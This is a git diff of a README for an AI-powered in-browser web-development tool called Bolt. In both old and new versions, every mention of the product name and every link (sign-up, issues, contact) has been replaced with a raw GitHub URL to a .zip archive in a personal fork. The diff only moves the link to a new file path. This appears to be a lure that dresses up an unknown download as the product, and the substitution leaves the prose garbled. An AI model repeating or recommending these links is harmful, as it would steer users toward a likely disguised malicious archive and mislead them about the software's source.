@@ -1,29 +1,29 @@
-[![https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip AI-Powered Full-Stack Web Development in the Browser](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip)](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip)
+[![https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip AI-Powered Full-Stack Web Development in the Browser](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip)](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip)
 
-# https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip AI-Powered Full-Stack Web Development in the Browser
+# https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip AI-Powered Full-Stack Web Development in the Browser
 
-https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip is an AI-powered web development agent that allows you to prompt, run, edit, and deploy full-stack applications directly from your browser—no local setup required. If you're here to build your own AI-powered web dev agent using the Bolt open source codebase, [click here to get started!](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip)
+https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip is an AI-powered web development agent that allows you to prompt, run, edit, and deploy full-stack applications directly from your browser—no local setup required. If you're here to build your own AI-powered web dev agent using the Bolt open source codebase, [click here to get started!](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip)
 
-## What Makes https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip Different
+## What Makes https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip Different
 
-Claude, v0, etc are incredible- but you can't install packages, run backends or edit code. That’s where https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip stands out:
+Claude, v0, etc are incredible- but you can't install packages, run backends or edit code. That’s where https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip stands out:
 
-- **Full-Stack in the Browser**: https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip integrates cutting-edge AI models with an in-browser development environment powered by **StackBlitz’s WebContainers**. This allows you to:
-  - Install and run npm tools and libraries (like Vite, https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip, and more)
-  - Run https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip servers
+- **Full-Stack in the Browser**: https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip integrates cutting-edge AI models with an in-browser development environment powered by **StackBlitz’s WebContainers**. This allows you to:
+  - Install and run npm tools and libraries (like Vite, https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip, and more)
+  - Run https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip servers
   - Interact with third-party APIs
   - Deploy to production from chat
   - Share your work via a URL
 
-- **AI with Environment Control**: Unlike traditional dev environments where the AI can only assist in code generation, https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip gives AI models **complete control** over the entire  environment including the filesystem, node server, package manager, terminal, and browser console. This empowers AI agents to handle the entire app lifecycle—from creation to deployment.
+- **AI with Environment Control**: Unlike traditional dev environments where the AI can only assist in code generation, https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip gives AI models **complete control** over the entire  environment including the filesystem, node server, package manager, terminal, and browser console. This empowers AI agents to handle the entire app lifecycle—from creation to deployment.
 
-Whether you’re an experienced developer, a PM or designer, https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip allows you to build production-grade full-stack applications with ease.
+Whether you’re an experienced developer, a PM or designer, https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip allows you to build production-grade full-stack applications with ease.
 
 For developers interested in building their own AI-powered development tools with WebContainers, check out the open-source Bolt codebase in this repo!
 
 ## Tips and Tricks
 
-Here are some tips to get the most out of https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip
+Here are some tips to get the most out of https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip
 
 - **Be specific about your stack**: If you want to use specific frameworks or libraries (like Astro, Tailwind, ShadCN, or any other popular JavaScript framework), mention them in your initial prompt to ensure Bolt scaffolds the project accordingly.
 
@@ -36,19 +36,19 @@ Here are some tips to get the most out of https://raw.githubusercontent.com/huza
 ## FAQs
 
 **Where do I sign up for a paid plan?**  
-https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip is free to get started. If you need more AI tokens or want private projects, you can purchase a paid subscription in your [https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip) settings, in the lower-left hand corner of the application. 
+https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip is free to get started. If you need more AI tokens or want private projects, you can purchase a paid subscription in your [https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip) settings, in the lower-left hand corner of the application. 
 
 **What happens if I hit the free usage limit?**  
 Once your free daily token limit is reached, AI interactions are paused until the next day or until you upgrade your plan.
 
 **Is Bolt in beta?**  
-Yes, https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip is in beta, and we are actively improving it based on feedback.
+Yes, https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip is in beta, and we are actively improving it based on feedback.
 
-**How can I report https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip issues?**  
-Check out the [Issues section](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip) to report an issue or request a new feature. Please use the search feature to check if someone else has already submitted the same issue/request.
+**How can I report https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip issues?**  
+Check out the [Issues section](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip) to report an issue or request a new feature. Please use the search feature to check if someone else has already submitted the same issue/request.
 
 **What frameworks/libraries currently work on Bolt?**  
-https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip supports most popular JavaScript frameworks and libraries. If it runs on StackBlitz, it will run on https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip as well.
+https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip supports most popular JavaScript frameworks and libraries. If it runs on StackBlitz, it will run on https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip as well.
 
 **How can I add make sure my framework/project works well in bolt?**  
-We are excited to work with the JavaScript ecosystem to improve functionality in Bolt. Reach out to us via [https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/types/bolt-new-transpleural.zip) to discuss how we can partner!
+We are excited to work with the JavaScript ecosystem to improve functionality in Bolt. Reach out to us via [https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip](https://raw.githubusercontent.com/huzaifa-mn/bolt.new/main/app/lib/bolt-new-v3.0.zip) to discuss how we can partner!
